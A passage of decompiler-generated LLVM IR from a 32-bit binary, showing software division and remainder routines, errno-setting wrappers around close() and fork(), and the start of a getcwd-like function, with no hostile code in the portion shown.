  %v1_ca84 = phi i32 [ %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, %bb83 ], [ %v1_ca38, %dec_label_pc_ca78 ]
  %v3_caa412 = phi i32 [ %v3_caa4, %bb83 ], [ %v1_ca6c, %dec_label_pc_ca78 ]
  %v3_ca80 = icmp ult i32 %v1_ca84, %v3_caa412
  %v3_ca84 = select i1 %v3_ca80, i32 0, i32 %v3_caa412
  %v1_ca8c = sub i32 %v1_ca84, %v3_ca84
  %v4_ca88 = udiv i32 %v3_caa412, 2
  %v6_ca88 = icmp ult i32 %v1_ca8c, %v4_ca88
  %v6_ca8c = select i1 %v6_ca88, i32 0, i32 %v4_ca88
  %v1_ca8c.v6_ca8c = sub i32 %v1_ca8c, %v6_ca8c
  %.demorgan = and i1 %v3_ca80, %v6_ca88
  %v4_ca90 = udiv i32 %v3_caa412, 4
  %v6_ca90 = icmp ult i32 %v1_ca8c.v6_ca8c, %v4_ca90
  %v6_ca94 = select i1 %v6_ca90, i32 0, i32 %v4_ca90
  %v1_ca8c.v6_ca8c.v6_ca94 = sub i32 %v1_ca8c.v6_ca8c, %v6_ca94
  %.demorgan71 = and i1 %.demorgan, %v6_ca90
  %v4_ca98 = udiv i32 %v3_caa412, 8
  %v6_ca98 = icmp ult i32 %v1_ca8c.v6_ca8c.v6_ca94, %v4_ca98
  %v6_ca9c = select i1 %v6_ca98, i32 0, i32 %v4_ca98
  %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c = sub i32 %v1_ca8c.v6_ca8c.v6_ca94, %v6_ca9c
  %.demorgan72 = and i1 %.demorgan71, %v6_ca98
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_ca80
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_ca80, %bb80
  %v2_caa0 = add i32 %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, -1
  %v4_caa0 = sub i32 0, %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c
  %v5_caa0 = and i32 %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, %v4_caa0
  %v3_caa4 = udiv i32 %v3_caa412, 16
  %v5_caa8 = icmp slt i32 %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, 1
  br i1 %v5_caa8, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_caa8 = add i32 %v6_caa8, -4
  %v9_caa8 = sub i32 3, %v6_caa8
  %v10_caa8 = and i32 %v9_caa8, %v6_caa8
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_cab0 = phi i32 [ %v6_caa8, %bb81 ], [ %v7_caa8, %bb82 ]
  %v0_caac15.in = phi i32 [ %v2_caa0, %bb81 ], [ %v7_caa8, %bb82 ]
  %v1_caac14.in = phi i32 [ %v5_caa0, %bb81 ], [ %v10_caa8, %bb82 ]
  %v1_caac14 = icmp slt i32 %v1_caac14.in, 0
  %v0_caac15 = icmp slt i32 %v0_caac15.in, 0
  %v2_caac = xor i1 %v0_caac15, %v1_caac14
  br i1 %v2_caac, label %dec_label_pc_cab0, label %dec_label_pc_ca80

dec_label_pc_cab0:                                ; preds = %bb83
  %v1_cab0 = urem i32 %v0_cab0, 4
  %v2_cab0 = icmp eq i32 %v1_cab0, 0
  br i1 %v2_cab0, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_cab0
  %v3_cab4 = icmp eq i32 %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, 0
  br i1 %v3_cab4, label %bb76, label %dec_label_pc_cabc

dec_label_pc_cabc:                                ; preds = %bb84, %dec_label_pc_ca78
  %v0_cad0 = phi i32 [ %v3_caa4, %bb84 ], [ %v1_ca6c, %dec_label_pc_ca78 ]
  %v1_cacc = phi i32 [ %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, %bb84 ], [ %v1_ca38, %dec_label_pc_ca78 ]
  %v0_cabc = phi i32 [ %v0_cab0, %bb84 ], [ %v2_ca78, %dec_label_pc_ca78 ]
  %v5_cac0 = icmp slt i32 %v0_cabc, -2
  br i1 %v5_cac0, label %dec_label_pc_cae0, label %dec_label_pc_cac4

dec_label_pc_cac4:                                ; preds = %dec_label_pc_cabc
  %v8_cabc = icmp eq i32 %v0_cabc, -2
  br i1 %v8_cabc, label %dec_label_pc_cad4, label %dec_label_pc_cac8

dec_label_pc_cac8:                                ; preds = %dec_label_pc_cac4
  %v3_cac8 = icmp ult i32 %v1_cacc, %v0_cad0
  br i1 %v3_cac8, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_cac8
  %v2_cac8 = sub i32 %v1_cacc, %v0_cad0
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_cac8, %bb85
  %v0_cad452 = phi i32 [ %v1_cacc, %dec_label_pc_cac8 ], [ %v2_cac8, %bb85 ]
  %v3_cad0 = udiv i32 %v0_cad0, 2
  br label %dec_label_pc_cad4

dec_label_pc_cad4:                                ; preds = %dec_label_pc_cac4, %bb86
  %v0_cadc = phi i32 [ %v0_cad0, %dec_label_pc_cac4 ], [ %v3_cad0, %bb86 ]
  %v1_cad8 = phi i32 [ %v1_cacc, %dec_label_pc_cac4 ], [ %v0_cad452, %bb86 ]
  %v3_cad4 = icmp ult i32 %v1_cad8, %v0_cadc
  br i1 %v3_cad4, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_cad4
  %v2_cad4 = sub i32 %v1_cad8, %v0_cadc
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_cad4, %bb87
  %v0_cae055 = phi i32 [ %v1_cad8, %dec_label_pc_cad4 ], [ %v2_cad4, %bb87 ]
  %v3_cadc = udiv i32 %v0_cadc, 2
  br label %dec_label_pc_cae0

dec_label_pc_cae0:                                ; preds = %dec_label_pc_cabc, %bb88
  %v2_cae4 = phi i32 [ %v0_cad0, %dec_label_pc_cabc ], [ %v3_cadc, %bb88 ]
  %v1_cae4 = phi i32 [ %v1_cacc, %dec_label_pc_cabc ], [ %v0_cae055, %bb88 ]
  %v3_cae0 = icmp ult i32 %v1_cae4, %v2_cae4
  br i1 %v3_cae0, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_cae0
  %v2_cae0 = sub i32 %v1_cae4, %v2_cae4
  br label %bb76

dec_label_pc_caec:                                ; preds = %dec_label_pc_ca30
  %v0_caec = load i32, i32* @lr, align 4
  %v0_caf0 = call i32 @function_cbe0()
  call void @__pseudo_branch(i32 %v0_caec)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_cae4, { 1, 2, 0 }
  uselistorder i32 %v0_cad0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_cab0, { 1, 0, 2 }
  uselistorder i32 %v7_caa8, { 1, 0 }
  uselistorder i32 %v3_caa4, { 1, 0 }
  uselistorder i32 %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_ca98, { 1, 0 }
  uselistorder i32 %v4_ca90, { 1, 0 }
  uselistorder i32 %v4_ca88, { 1, 0 }
  uselistorder i32 %v6_caa8, { 3, 0, 2, 1 }
  uselistorder i32 %v2_ca78, { 1, 0 }
  uselistorder i32 %v1_ca6c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_ca58, { 1, 0, 3, 2 }
  uselistorder i32 %v0_ca64.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_ca38, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_cae0, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_cad4, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_ca80, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @function_cafc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cafc:
  store i32 %arg1, i32* @r0, align 4
  %v2_cafc = icmp eq i32 %arg2, 0
  br i1 %v2_cafc, label %dec_label_pc_cbd0, label %dec_label_pc_cb04

dec_label_pc_cb04:                                ; preds = %dec_label_pc_cafc
  %v1_cafc = icmp slt i32 %arg2, 0
  br i1 %v1_cafc, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_cb04
  %v2_cb04 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_cb04, %bb
  %v4_cb1c = phi i32 [ %arg2, %dec_label_pc_cb04 ], [ %v2_cb04, %bb ]
  %v0_cb08 = load i32, i32* @r0, align 4
  %v1_cb08 = icmp slt i32 %v0_cb08, 0
  br i1 %v1_cb08, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_cb0c = sub i32 0, %v0_cb08
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_cb14 = phi i32 [ %v0_cb08, %bb79 ], [ %v2_cb0c, %bb80 ]
  %v1_cb10 = add i32 %v4_cb1c, -1
  %v7_cb10 = icmp eq i32 %v4_cb1c, 1
  br i1 %v7_cb10, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_cb14 = icmp eq i32 %v1_cb14, %v4_cb1c
  br i1 %v10_cb14, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_cb14 = icmp ult i32 %v1_cb14, %v4_cb1c
  br i1 %v4_cb14, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_cb1c = and i32 %v1_cb10, %v4_cb1c
  %v8_cb1c = icmp eq i32 %v6_cb1c, 0
  br i1 %v8_cb1c, label %.thread72, label %dec_label_pc_cb2c.preheader

dec_label_pc_cb2c.preheader:                      ; preds = %bb84
  %v2_cb2c109 = icmp ugt i32 %v4_cb1c, 268435455
  br i1 %v2_cb2c109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_cb2064 = phi i32 [ %v1_cb14, %bb84 ], [ 0, %.thread70 ]
  %v3_cb20 = and i32 %v1_cb2064, %v1_cb10
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_cb2c.preheader
  %v0_cb40.pr35.lcssa = phi i32 [ %v4_cb1c, %dec_label_pc_cb2c.preheader ], [ %v4_cb34, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_cb2c.preheader ], [ %v2_cb389, %.thread2.thread7 ]
  br label %dec_label_pc_cb40thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_cb2c.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_cb389, %.thread2.thread7 ], [ 0, %dec_label_pc_cb2c.preheader ]
  %v0_cb40.pr35110 = phi i32 [ %v4_cb34, %.thread2.thread7 ], [ %v4_cb1c, %dec_label_pc_cb2c.preheader ]
  %v4_cb30 = icmp ult i32 %v0_cb40.pr35110, %v1_cb14
  br i1 %v4_cb30, label %bb86, label %dec_label_pc_cb40thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_cb34 = and i32 %v0_cb40.pr35110, 268435456
  %v3_cb34 = icmp eq i32 %v2_cb34, 0
  %v4_cb34 = mul i32 %v0_cb40.pr35110, 16
  br i1 %v3_cb34, label %.thread2.thread7, label %dec_label_pc_cb40.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_cb389 = add i32 %storemerge111, 4
  %v2_cb2c = icmp ugt i32 %v4_cb34, 268435455
  br i1 %v2_cb2c, label %.thread1, label %bb85

dec_label_pc_cb40thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_cb40thread-pre-split.loopexit

dec_label_pc_cb40thread-pre-split.loopexit:       ; preds = %dec_label_pc_cb40thread-pre-split.loopexit.loopexit, %.thread1
  %v0_cb40.pr35108 = phi i32 [ %v0_cb40.pr35.lcssa, %.thread1 ], [ %v0_cb40.pr35110, %dec_label_pc_cb40thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_cb40thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_cb40thread-pre-split

dec_label_pc_cb40thread-pre-split:                ; preds = %.thread4, %dec_label_pc_cb40thread-pre-split.loopexit
  %v1_cb4c41 = phi i32 [ %storemerge105, %dec_label_pc_cb40thread-pre-split.loopexit ], [ %v2_cb4c, %.thread4 ]
  %v2_cb4436 = phi i32 [ %v1_cb14, %dec_label_pc_cb40thread-pre-split.loopexit ], [ %v2_cb44, %.thread4 ]
  %v0_cb40.pr = phi i32 [ %v0_cb40.pr35108, %dec_label_pc_cb40thread-pre-split.loopexit ], [ %v3_cb48, %.thread4 ]
  br label %dec_label_pc_cb40

dec_label_pc_cb40.loopexit:                       ; preds = %bb86
  br label %dec_label_pc_cb40

dec_label_pc_cb40:                                ; preds = %dec_label_pc_cb40.loopexit, %dec_label_pc_cb40thread-pre-split
  %v0_cb54.pr = phi i32 [ %v1_cb4c41, %dec_label_pc_cb40thread-pre-split ], [ %storemerge111, %dec_label_pc_cb40.loopexit ]
  %v2_cb44 = phi i32 [ %v2_cb4436, %dec_label_pc_cb40thread-pre-split ], [ %v1_cb14, %dec_label_pc_cb40.loopexit ]
  %v1_cb48 = phi i32 [ %v0_cb40.pr, %dec_label_pc_cb40thread-pre-split ], [ %v4_cb34, %dec_label_pc_cb40.loopexit ]
  %v2_cb40 = icmp slt i32 %v1_cb48, 0
  br i1 %v2_cb40, label %dec_label_pc_cb54, label %bb87

bb87:                                             ; preds = %dec_label_pc_cb40
  %v4_cb44 = icmp ult i32 %v1_cb48, %v2_cb44
  br i1 %v4_cb44, label %.thread4, label %dec_label_pc_cb54

.thread4:                                         ; preds = %bb87
  %v3_cb48 = mul i32 %v1_cb48, 2
  %v2_cb4c = add i32 %v0_cb54.pr, 1
  br label %dec_label_pc_cb40thread-pre-split

dec_label_pc_cb54:                                ; preds = %bb87, %dec_label_pc_cb40
  %v2_cb54 = add i32 %v0_cb54.pr, -3
  %v5_cb58 = icmp slt i32 %v0_cb54.pr, 3
  br i1 %v5_cb58, label %dec_label_pc_cb98, label %dec_label_pc_cb5c

dec_label_pc_cb5c:                                ; preds = %dec_label_pc_cb54, %bb91
  %v6_cb84 = phi i32 [ %v0_cb8c, %bb91 ], [ %v2_cb54, %dec_label_pc_cb54 ]
  %v1_cb60 = phi i32 [ %v1_cb68.v6_cb68.v6_cb70.v6_cb78, %bb91 ], [ %v2_cb44, %dec_label_pc_cb54 ]
  %v3_cb8010 = phi i32 [ %v3_cb80, %bb91 ], [ %v1_cb48, %dec_label_pc_cb54 ]
  %v3_cb5c = icmp ult i32 %v1_cb60, %v3_cb8010
  %v3_cb60 = select i1 %v3_cb5c, i32 0, i32 %v3_cb8010
  %v1_cb68 = sub i32 %v1_cb60, %v3_cb60
  %v4_cb64 = udiv i32 %v3_cb8010, 2
  %v6_cb64 = icmp ult i32 %v1_cb68, %v4_cb64
  %v6_cb68 = select i1 %v6_cb64, i32 0, i32 %v4_cb64
  %v1_cb68.v6_cb68 = sub i32 %v1_cb68, %v6_cb68
  %.demorgan = and i1 %v3_cb5c, %v6_cb64
  %v4_cb6c = udiv i32 %v3_cb8010, 4
  %v6_cb6c = icmp ult i32 %v1_cb68.v6_cb68, %v4_cb6c
  %v6_cb70 = select i1 %v6_cb6c, i32 0, i32 %v4_cb6c
  %v1_cb68.v6_cb68.v6_cb70 = sub i32 %v1_cb68.v6_cb68, %v6_cb70
  %.demorgan76 = and i1 %.demorgan, %v6_cb6c
  %v4_cb74 = udiv i32 %v3_cb8010, 8
  %v6_cb74 = icmp ult i32 %v1_cb68.v6_cb68.v6_cb70, %v4_cb74
  %v6_cb78 = select i1 %v6_cb74, i32 0, i32 %v4_cb74
  %v1_cb68.v6_cb68.v6_cb70.v6_cb78 = sub i32 %v1_cb68.v6_cb68.v6_cb70, %v6_cb78
  %.demorgan77 = and i1 %.demorgan76, %v6_cb74
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_cb5c
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_cb5c, %bb88
  %v2_cb7c = add i32 %v1_cb68.v6_cb68.v6_cb70.v6_cb78, -1
  %v4_cb7c = sub i32 0, %v1_cb68.v6_cb68.v6_cb70.v6_cb78
  %v5_cb7c = and i32 %v1_cb68.v6_cb68.v6_cb70.v6_cb78, %v4_cb7c
  %v3_cb80 = udiv i32 %v3_cb8010, 16
  %v5_cb84 = icmp slt i32 %v1_cb68.v6_cb68.v6_cb70.v6_cb78, 1
  br i1 %v5_cb84, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_cb84 = add i32 %v6_cb84, -4
  %v9_cb84 = sub i32 3, %v6_cb84
  %v10_cb84 = and i32 %v9_cb84, %v6_cb84
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_cb8c = phi i32 [ %v6_cb84, %bb89 ], [ %v7_cb84, %bb90 ]
  %v0_cb8813.in = phi i32 [ %v2_cb7c, %bb89 ], [ %v7_cb84, %bb90 ]
  %v1_cb8812.in = phi i32 [ %v5_cb7c, %bb89 ], [ %v10_cb84, %bb90 ]
  %v1_cb8812 = icmp slt i32 %v1_cb8812.in, 0
  %v0_cb8813 = icmp slt i32 %v0_cb8813.in, 0
  %v2_cb88 = xor i1 %v0_cb8813, %v1_cb8812
  br i1 %v2_cb88, label %dec_label_pc_cb8c, label %dec_label_pc_cb5c

dec_label_pc_cb8c:                                ; preds = %bb91
  %v1_cb8c = urem i32 %v0_cb8c, 4
  %v2_cb8c = icmp eq i32 %v1_cb8c, 0
  br i1 %v2_cb8c, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_cb8c
  %v3_cb90 = icmp eq i32 %v1_cb68.v6_cb68.v6_cb70.v6_cb78, 0
  br i1 %v3_cb90, label %.thread6, label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %bb92, %dec_label_pc_cb54
  %v0_cbac = phi i32 [ %v3_cb80, %bb92 ], [ %v1_cb48, %dec_label_pc_cb54 ]
  %v1_cba8 = phi i32 [ %v1_cb68.v6_cb68.v6_cb70.v6_cb78, %bb92 ], [ %v2_cb44, %dec_label_pc_cb54 ]
  %v0_cb98 = phi i32 [ %v0_cb8c, %bb92 ], [ %v2_cb54, %dec_label_pc_cb54 ]
  %v5_cb9c = icmp slt i32 %v0_cb98, -2
  br i1 %v5_cb9c, label %dec_label_pc_cbbc, label %dec_label_pc_cba0

dec_label_pc_cba0:                                ; preds = %dec_label_pc_cb98
  %v8_cb98 = icmp eq i32 %v0_cb98, -2
  br i1 %v8_cb98, label %dec_label_pc_cbb0, label %dec_label_pc_cba4

dec_label_pc_cba4:                                ; preds = %dec_label_pc_cba0
  %v3_cba4 = icmp ult i32 %v1_cba8, %v0_cbac
  br i1 %v3_cba4, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_cba4
  %v2_cba4 = sub i32 %v1_cba8, %v0_cbac
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_cba4, %bb93
  %v0_cbb054 = phi i32 [ %v1_cba8, %dec_label_pc_cba4 ], [ %v2_cba4, %bb93 ]
  %v3_cbac = udiv i32 %v0_cbac, 2
  br label %dec_label_pc_cbb0

dec_label_pc_cbb0:                                ; preds = %dec_label_pc_cba0, %bb94
  %v0_cbb8 = phi i32 [ %v0_cbac, %dec_label_pc_cba0 ], [ %v3_cbac, %bb94 ]
  %v1_cbb4 = phi i32 [ %v1_cba8, %dec_label_pc_cba0 ], [ %v0_cbb054, %bb94 ]
  %v3_cbb0 = icmp ult i32 %v1_cbb4, %v0_cbb8
  br i1 %v3_cbb0, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_cbb0
  %v2_cbb0 = sub i32 %v1_cbb4, %v0_cbb8
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_cbb0, %bb95
  %v0_cbbc57 = phi i32 [ %v1_cbb4, %dec_label_pc_cbb0 ], [ %v2_cbb0, %bb95 ]
  %v3_cbb8 = udiv i32 %v0_cbb8, 2
  br label %dec_label_pc_cbbc

dec_label_pc_cbbc:                                ; preds = %dec_label_pc_cb98, %bb96
  %v2_cbc0 = phi i32 [ %v0_cbac, %dec_label_pc_cb98 ], [ %v3_cbb8, %bb96 ]
  %v1_cbc0 = phi i32 [ %v1_cba8, %dec_label_pc_cb98 ], [ %v0_cbbc57, %bb96 ]
  %v3_cbbc = icmp ult i32 %v1_cbc0, %v2_cbc0
  br i1 %v3_cbbc, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_cbbc
  %v2_cbbc = sub i32 %v1_cbc0, %v2_cbc0
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_cbbc, %bb83, %.thread72, %dec_label_pc_cb8c, %bb92, %bb97
  %v1_cbc8 = phi i32 [ %v1_cb68.v6_cb68.v6_cb70.v6_cb78, %dec_label_pc_cb8c ], [ 0, %bb92 ], [ %v1_cbc0, %dec_label_pc_cbbc ], [ %v2_cbbc, %bb97 ], [ %v3_cb20, %.thread72 ], [ %v1_cb14, %bb83 ]
  br i1 %v1_cb08, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_cbc8 = sub i32 0, %v1_cbc8
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_cbcc = phi i32 [ %v1_cbc8, %.thread6 ], [ %v2_cbc8, %bb98 ]
  ret i32 %v1_cbcc

dec_label_pc_cbd0:                                ; preds = %dec_label_pc_cafc
  %v0_cbd0 = load i32, i32* @lr, align 4
  %v0_cbd4 = call i32 @function_cbe0()
  call void @__pseudo_branch(i32 %v0_cbd0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_cbac, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_cb8c, { 1, 0, 2 }
  uselistorder i32 %v7_cb84, { 1, 0 }
  uselistorder i32 %v3_cb80, { 1, 0 }
  uselistorder i32 %v1_cb68.v6_cb68.v6_cb70.v6_cb78, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_cb74, { 1, 0 }
  uselistorder i32 %v4_cb6c, { 1, 0 }
  uselistorder i32 %v4_cb64, { 1, 0 }
  uselistorder i32 %v6_cb84, { 3, 0, 2, 1 }
  uselistorder i32 %v2_cb54, { 1, 0 }
  uselistorder i32 %v1_cb48, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_cb44, { 1, 0, 3, 2 }
  uselistorder i32 %v4_cb34, { 1, 0, 3, 2 }
  uselistorder i32 %v0_cb40.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_cb14, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_cb1c, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_cbbc, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_cbb0, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_cb5c, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @function_cbe0() local_unnamed_addr {
dec_label_pc_cbe0:
  %v1_cbe0 = load i32, i32* @r0, align 4
  ret i32 %v1_cbe0
}

define i32 @function_cbe4(i32 %arg1) local_unnamed_addr {
dec_label_pc_cbe4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cbe4 = load i32, i32* @r4, align 4
  store i32 %v3_cbe4, i32* %stack_var_-8, align 4
  %v1_cbe8 = call i32 @close(i32 %arg1)
  store i32 %v1_cbe8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_cbe8, -4095
  br i1 %tmp, label %dec_label_pc_cc08, label %dec_label_pc_cbf8

dec_label_pc_cbf8:                                ; preds = %dec_label_pc_cbe4
  %v0_cbf8 = call i32 @function_cec4()
  %v0_cbfc = load i32, i32* %r4.global-to-local, align 4
  %v1_cbfc = sub i32 0, %v0_cbfc
  %v2_cc00 = inttoptr i32 %v0_cbf8 to i32*
  store i32 %v1_cbfc, i32* %v2_cc00, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cc08

dec_label_pc_cc08:                                ; preds = %dec_label_pc_cbe4, %dec_label_pc_cbf8
  %v0_cc08 = phi i32 [ %v1_cbe8, %dec_label_pc_cbe4 ], [ -1, %dec_label_pc_cbf8 ]
  %v2_cc0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cc0c, i32* @r4, align 4
  ret i32 %v0_cc08

; uselistorder directives
  uselistorder i32 %v1_cbe8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cc08, { 1, 0 }
}

define i32 @function_cc10() local_unnamed_addr {
dec_label_pc_cc10:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cc10 = load i32, i32* @r4, align 4
  store i32 %v3_cc10, i32* %stack_var_-8, align 4
  %v0_cc14 = call i32 @fork()
  store i32 %v0_cc14, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_cc14, -4095
  br i1 %tmp, label %dec_label_pc_cc34, label %dec_label_pc_cc24

dec_label_pc_cc24:                                ; preds = %dec_label_pc_cc10
  %v0_cc24 = call i32 @function_cec4()
  %v0_cc28 = load i32, i32* %r4.global-to-local, align 4
  %v1_cc28 = sub i32 0, %v0_cc28
  %v2_cc2c = inttoptr i32 %v0_cc24 to i32*
  store i32 %v1_cc28, i32* %v2_cc2c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cc34

dec_label_pc_cc34:                                ; preds = %dec_label_pc_cc10, %dec_label_pc_cc24
  %v0_cc34 = phi i32 [ %v0_cc14, %dec_label_pc_cc10 ], [ -1, %dec_label_pc_cc24 ]
  %v2_cc38 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cc38, i32* @r4, align 4
  ret i32 %v0_cc34

; uselistorder directives
  uselistorder i32 %v0_cc14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cc34, { 1, 0 }
}

define i32 @function_cc3c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cc3c:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_cc3c = load i32, i32* @r4, align 4
  store i32 %v3_cc3c, i32* %stack_var_-20, align 4
  %v6_cc3c = load i32, i32* @r5, align 4
  %v9_cc3c = load i32, i32* @r6, align 4
  %v12_cc3c = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_cc40 = icmp eq i32 %arg2, 0
  store i32 %tmp, i32* @r5, align 4
  %v3_cc4c = icmp eq i8* %arg1, null
  br i1 %v2_cc40, label %dec_label_pc_cc4c, label %dec_label_pc_cc7c

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc3c
  br i1 %v3_cc4c, label %dec_label_pc_cc68, label %dec_label_pc_cc54

dec_label_pc_cc54:                                ; preds = %dec_label_pc_cc4c
  %v0_cc54 = call i32 @function_cec4()
  %v0_cc58 = load i32, i32* @r7, align 4
  store i32 %v0_cc58, i32* @r5, align 4
  %v2_cc60 = inttoptr i32 %v0_cc54 to i32*
  store i32 22, i32* %v2_cc60, align 4
  br label %dec_label_pc_cd0c

dec_label_pc_cc68:                                ; preds = %dec_label_pc_cc4c
  %v0_cc68 = call i32 @function_cd14()
  %v5_cc70 = icmp slt i32 %v0_cc68, 4096
  br i1 %v5_cc70, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_cc68
  store i32 %v0_cc68, i32* @r4, align 4
  br label %dec_label_pc_cc8c

bb16:                                             ; preds = %dec_label_pc_cc68
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_cc8c

dec_label_pc_cc7c:                                ; preds = %dec_label_pc_cc3c
  store i32 %arg2, i32* @r4, align 4
  br i1 %v3_cc4c, label %dec_label_pc_cc8c, label %bb17

bb17:                                             ; preds = %dec_label_pc_cc7c
  store i32 %tmp, i32* @r6, align 4
  br label %dec_label_pc_cc9c

dec_label_pc_cc8c:                                ; preds = %dec_label_pc_cc7c, %bb, %bb16
  %v0_cc8c = phi i32 [ %v0_cc68, %bb ], [ 4096, %bb16 ], [ %arg2, %dec_label_pc_cc7c ]
  %v1_cc90 = call i32 @function_fc78(i32 %v0_cc8c)
  store i32 %v1_cc90, i32* @r6, align 4
  %v2_cc94 = icmp eq i32 %v1_cc90, 0
  br i1 %v2_cc94, label %dec_label_pc_cd08, label %dec_label_pc_cc8c.dec_label_pc_cc9c_crit_edge

dec_label_pc_cc8c.dec_label_pc_cc9c_crit_edge:    ; preds = %dec_label_pc_cc8c
  %v0_cc9c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc9c

dec_label_pc_cc9c:                                ; preds = %bb17, %dec_label_pc_cc8c.dec_label_pc_cc9c_crit_edge
  %v0_cca0 = phi i32 [ %v1_cc90, %dec_label_pc_cc8c.dec_label_pc_cc9c_crit_edge ], [ %tmp, %bb17 ]
